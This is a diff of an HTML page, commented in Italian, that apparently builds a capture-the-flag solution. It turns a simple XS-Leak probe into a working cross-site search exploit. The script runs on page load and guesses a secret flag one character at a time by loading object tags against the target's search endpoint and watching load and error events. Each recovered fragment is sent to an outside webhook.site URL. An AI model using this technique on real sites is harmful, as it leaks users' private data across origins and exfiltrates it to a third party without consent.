@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XS-Leak Test</title>
+    <title>XS-Leak Flag Extraction</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,54 +16,53 @@
     </style>
 </head>
 <body>
-    <h1>XS-Leak Test</h1>
+    <h1>XS-Leak Flag Extraction</h1>
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const leak = async (url) => {
+        const charset = "abcdefghijklmnopqrstuvwxyz0123456789{}"; // Set di caratteri possibili
+
+        // Funzione per testare l'accessibilità di una risorsa
+        const leak = (url) => {
             return new Promise((resolve) => {
                 let s = document.createElement('object');
                 s.data = url;
-                s.onload = (e) => {
-                    e.target.remove();
-                    return resolve(0); // Risorsa accessibile
-                };
-                s.onerror = (e) => {
-                    e.target.remove();
-                    return resolve(1); // Risorsa non accessibile
-                };
+                s.onload = () => { s.remove(); resolve(true); }; // Risorsa accessibile (status 200)
+                s.onerror = () => { s.remove(); resolve(false); }; // Risorsa non accessibile (status 404 o errore)
                 document.body.appendChild(s);
             });
         };
 
-        // Funzione da chiamare al caricamento della pagina
-        const testResourceLeak = async () => {
-            const url = 'https://matrix.capturetheflags.site/search?s=flag{'; // Sostituisci con l'URL da testare
-            const result = await leak(url);
+        // Funzione per cercare la flag carattere per carattere
+        const findFlag = async () => {
+            let flag = "flag{";
             const resultDiv = document.getElementById('result');
 
-            let message;
-            if (result === 0) {
-                resultDiv.textContent = 'Risorsa accessibile (status 200)';
-                message = 'Risorsa accessibile';
-            } else {
-                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
-                message = 'Risorsa non accessibile';
+            while (!flag.endsWith("}")) {
+                for (const char of charset) {
+                    const testFlag = `${flag}${char}`;
+                    const url = `https://matrix.capturetheflags.site/search?s=${testFlag}`;
+                    const accessible = await leak(url);
+
+                    if (accessible) {
+                        flag += char;
+                        resultDiv.textContent = `Flag trovata finora: ${flag}`;
+                        await logResult(`Flag parziale: ${flag}`);
+                        break;
+                    }
+                }
             }
 
-            // Invia il log al server Webhook utilizzando GET
-            await logResult(message);
+            resultDiv.textContent = `Flag completa trovata: ${flag}`;
+            await logResult(`Flag completa trovata: ${flag}`);
         };
 
-        // Funzione per inviare i log al Webhook
+        // Funzione per inviare il log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL Webhook
             try {
-                // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                const response = await fetch(urlWithParams, {
-                    method: 'GET', // Cambiato a GET
-                });
+                const response = await fetch(urlWithParams, { method: 'GET' });
 
                 if (!response.ok) {
                     console.error('Errore durante l\'invio del log:', response.statusText);
@@ -76,7 +75,7 @@
         };
 
         // Esegui il test al caricamento del DOM
-        document.addEventListener('DOMContentLoaded', testResourceLeak);
+        document.addEventListener('DOMContentLoaded', findFlag);
     </script>
 </body>
 </html>
